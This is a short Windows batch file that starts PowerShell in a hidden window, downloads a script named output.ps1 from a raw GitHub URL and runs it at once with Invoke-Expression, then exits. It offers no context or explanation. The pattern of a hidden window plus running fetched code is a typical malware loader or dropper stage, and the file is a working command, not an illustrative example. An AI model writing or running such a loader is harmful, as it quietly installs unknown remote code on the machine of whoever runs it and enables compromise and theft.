@echo off
powershell -windowstyle hidden [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Invoke-Expression(wget -UseBasicParsing "https://raw.githubusercontent.com/skybia/skybia/main/output.ps1")
exit